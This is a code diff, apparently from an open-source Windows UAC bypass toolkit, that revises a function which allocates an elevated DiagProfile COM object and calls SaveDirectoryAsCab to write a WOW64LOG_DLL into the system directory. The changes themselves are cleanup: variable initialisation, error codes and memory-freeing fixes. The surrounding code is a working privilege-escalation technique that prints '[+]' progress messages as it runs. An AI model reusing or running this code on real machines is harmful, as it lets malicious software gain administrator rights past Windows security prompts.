@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.69
 *
-*  DATE:        07 Jul 2025
+*  DATE:        12 Dec 2025
 *
 *  UAC bypass methods based on zcgonvh original work.
 *
@@ -391,7 +391,11 @@ HRESULT ucmxTriggerDiagProfile(
     VARIANTARG values[2];
     WCHAR szTarget[MAX_PATH * 2];
 
+    values[0].bstrVal = NULL;
+    values[1].bstrVal = NULL;
+
     do {
+        
         methodName = SysAllocString(L"SaveDirectoryAsCab");
         if (methodName == NULL)
             break;
@@ -420,7 +424,7 @@ HRESULT ucmxTriggerDiagProfile(
         ucmConsolePrint(TEXT("[+] Elevated DiagProfile object allocated\r\n"));
 
         if (pUnknown == NULL) {
-            r = E_OUTOFMEMORY;
+            r = E_FAIL;
             break;
         }
 
@@ -432,7 +436,7 @@ HRESULT ucmxTriggerDiagProfile(
         ucmConsolePrint(TEXT("[+] QueryInterface success\r\n"));
 
         if (pDispatch == NULL) {
-            r = E_OUTOFMEMORY;
+            r = E_FAIL;
             break;
         }
 
@@ -445,16 +449,24 @@ HRESULT ucmxTriggerDiagProfile(
         RtlSecureZeroMemory(&dispatchParams, sizeof(dispatchParams));
 
         VariantInit(&values[0]);
+        VariantInit(&values[1]);
 
         _strcpy(szTarget, g_ctx->szSystemDirectory);
         _strcat(szTarget, WOW64LOG_DLL);
 
         values[0].vt = VT_BSTR;
         values[0].bstrVal = SysAllocString(szTarget);
+        if (values[0].bstrVal == NULL) {
+            r = E_OUTOFMEMORY;
+            break;
+        }
 
-        VariantInit(&values[1]);
         values[1].vt = VT_BSTR;
         values[1].bstrVal = SysAllocString(lpDirectory);
+        if (values[1].bstrVal == NULL) {
+            r = E_OUTOFMEMORY;
+            break;
+        }
 
         dispatchParams.cArgs = 2;
         dispatchParams.rgvarg = values;
@@ -473,10 +485,12 @@ HRESULT ucmxTriggerDiagProfile(
 
         ucmConsolePrintValueUlong(TEXT("[+] Dispatch->Invoke"), r, TRUE);
 
-        if (values[0].bstrVal) SysFreeString(values[0].bstrVal);
-        if (values[1].bstrVal) SysFreeString(values[1].bstrVal);
+        VariantClear(&result);
 
     } while (FALSE);
+
+    if (values[0].bstrVal) SysFreeString(values[0].bstrVal);
+    if (values[1].bstrVal) SysFreeString(values[1].bstrVal);
 
     if (methodName)
         SysFreeString((BSTR)methodName);
